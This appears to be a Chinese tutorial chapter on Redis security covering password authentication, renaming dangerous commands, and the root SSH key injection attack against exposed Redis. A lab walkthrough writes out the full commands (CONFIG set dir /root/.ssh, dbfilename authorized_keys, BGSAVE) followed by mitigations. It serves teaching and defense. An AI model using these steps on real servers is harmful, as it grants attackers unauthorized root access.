# 第4章 Redis安全管理

## 1.Redis用户密码

### 1）配置密码认证功能

```bash
requirepass 123456
```

### 2）使用密码

第一种：

```bash
[root@db-51 ~]# redis-cli
127.0.0.1:6379> set k1 v1
(error) NOAUTH Authentication required.
127.0.0.1:6379> AUTH 123456
OK
127.0.0.1:6379> keys *
1) "k1"
```

第二种：

```bash
[root@db-51 ~]# redis-cli -a '123456' get k1
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
"v1"
```

### 3）为什么redis的密码认证这么简单?

1.redis一般都部署在内网环境，相对比较安全的

2.有同学担心密码写在配置文件里，不用担心，因为开发不允许SSH登陆到Linux服务器，但是可以远程连接Redis，所以设置密码还是有作用的

## 2.禁用或重命名危险命令

### 1）禁用危险命令

```bash
rename-command KEYS ""
rename-command SHUTDOWN ""
rename-command CONFIG ""
rename-command FLUSHALL ""
```

### 2）命名危险命令

```bash
rename-command KEYS "QQ526195417"
rename-command SHUTDOWN ""
rename-command CONFIG ""
rename-command FLUSHALL ""
```

## 3.利用Redis远程入侵Linux

### 1）前提条件

```plain
1.redis以root用户运行
 2.redis允许远程登陆
 3.redis没有设置密码或者密码简单
```

### 2）入侵原理

```plain
1.本质是利用了redis的热更新配置，可以动态的设置数据持久化的路径和持久化文件名称
 2.首先攻击者可以远程登陆redis，然后将攻击者的ssh公钥当作一个key存入redis里
 3.利用动态修改配置，将持久化目录保存成/root/.ssh
 4.利用动态修改配置,将持久化文件名更改为authorized_keys
 5.执行数据保存命令，这样就会在生成/root/,ssh/authorized_keys文件
 6.而这个文件里包含了攻击者的密钥，所以此时攻击者可以免密登陆远程的服务器了
```

### 3）实验步骤

#### 1.生成密钥

```plain
 [root@db02 ~/.ssh]# ssh-keygen
```

#### 2.将密钥保存成文件

```plain
[root@db02 ~]# (echo -e "\n";cat /root/.ssh/id_rsa.pub ;echo -e "\n") > ssh_key
 [root@db02 ~]# cat ssh_key 
 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDH5vHJTq1UPP1YqzNUIfpXgWp5MV/hTzXStnT/JlusMG8/8DI2WYpbM20Pag5VlYKO8vA7Mn0ZbMmbpHUMOHLKmXK0y4k0bkYoSPTwbxP4a4paPLF50d+LRazqNq+P2RTnn7P9pG0kdSmpwDgcD32JjMJ7zxLFVbtsuOPfUHpnkvoI8967JC9kw/FH4CifZ+yyAneMxyqFstfKRPqUK0lwA/D5UuD4B4gv4WO6hu1bctHtI8qbIfSmHCgBrCG4qW+Xw1OWDimCLUwKUFW99RfVhzfmm9pTes+2twuf7wFK06LZVzcmfaXt43SFNLcVMMTn4RX0tzZyqVGYFtn94sOn root@db02
```

#### 3.将密钥写入redis

```plain
[root@db02 ~]# cat ssh_key |redis-cli -h 10.0.0.51 -x set ssh_key
 OK
```

#### 4.登陆redis动态修改配置并保存

```plain
[root@db02 ~]# redis-cli -h 10.0.0.51                                                   
 10.0.0.51:6379> CONFIG set dir /root/.ssh
 OK
 10.0.0.51:6379> CONFIG set dbfilename authorized_keys 
 OK
 10.0.0.51:6379> BGSAVE
 Background saving started
```

#### 5.被攻击的机器查看是否生成文件

 [root@db01 ~]# cat .ssh/authorized_keys 

#### 6.入侵者查看是否可以登陆

```plain
[root@db02 ~]# ssh 10.0.0.51                                                   
 Last login: Wed Jun 24 23:00:14 2020 from 10.0.0.52
 [root@db01 ~]#
```

此时可以发现，已经可以免密登陆了。

#### 7.如何防范

```plain
1.以普通用户启动redis,这样就没有办法在/root/目录下创建数据
 2.设置复杂的密码
 3.不要监听所有端口，只监听内网地址
 4.禁用动态修改配置的命令和危险命令
 5.做好监控和数据备份
```


 